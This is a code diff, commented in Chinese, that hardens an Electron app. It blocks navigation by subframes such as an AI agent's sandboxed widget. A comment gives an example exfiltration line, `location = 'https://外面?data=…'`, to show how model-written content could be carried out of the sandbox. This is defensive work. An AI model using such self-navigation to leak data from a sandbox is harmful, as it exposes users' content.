@@ -9,6 +9,7 @@
  *
  * 所以三道,都按同一个「应用来源」判:
  * - 主窗口的主框架只许导航到应用自己的地址,别的拦下(http(s) 交给系统浏览器,和 setWindowOpenHandler 一样);
+ *   子框架(智能体给的小界面)也一样,另外放行 srcdoc / 空白页,拦下的什么都不开;
  * - IPC 只收主窗口自己那个主框架、停在应用地址上时发来的;
  * - 壳令牌只加在应用页面发出的请求上。
  *
@@ -68,6 +69,17 @@ function guardNavigation(contents, { isAppUrl, openExternal, log = () => undefin
   contents.on("will-navigate", (event, url) => block("navigation", event, url, true));
   // 重定向不是人点的:拦下就好,不替它开外部浏览器。
   contents.on("will-redirect", (event, url) => block("redirect", event, url, false));
+  // **子框架**也只许停在应用地址上,外加 srcdoc / 空白页。眼下唯一的子框架是智能体给的小界面
+  // (前端 features/agent/agentWidget.ts):它关在不同源的沙箱里、CSP 断了网,但沙箱拦不住它**导航自己** ——
+  // `location = "https://外面?data=…"` 会把它手里的东西(模型写进 HTML 的内容)带出去,也能在对话里换上一张
+  // 别人的页面。CSP 管不到导航(navigate-to 没有浏览器实现),所以在这里拦。主框架那一份 will-navigate 已经管了,
+  // 这里只看子框架;拦下的不交给系统浏览器 —— 不是人点的(界面里的链接点击在沙箱里就被吞掉了)。
+  contents.on("will-frame-navigate", (event) => {
+    if (event?.isMainFrame) return;
+    const url = String(event?.url ?? "");
+    if (url === "about:srcdoc" || url === "about:blank") return;
+    block("subframe navigation", event, url, false);
+  });
 }
 
 /**
